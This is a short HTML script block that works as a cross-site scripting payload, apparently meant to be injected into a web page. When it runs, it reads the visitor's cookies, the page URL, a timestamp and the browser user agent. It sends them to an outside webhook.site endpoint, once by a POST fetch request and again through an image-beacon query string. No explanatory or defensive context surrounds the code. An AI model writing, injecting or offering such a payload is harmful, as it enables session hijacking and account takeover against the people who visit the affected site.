<script>
    var webhook = "https://webhook.site/#!/view/3ba54176-c9e2-4a19-9e45-905ec0f200d9";
    
    fetch(webhook, {
        method: "POST",
        mode: "no-cors",
        body: JSON.stringify({
            cookies: document.cookie,
            url: window.location.href,
            time: new Date().toISOString(),
            userAgent: navigator.userAgent
        })
    });
    
    new Image().src = webhook + "?cookies=" + encodeURIComponent(document.cookie) + "&url=" + encodeURIComponent(window.location.href);
</script>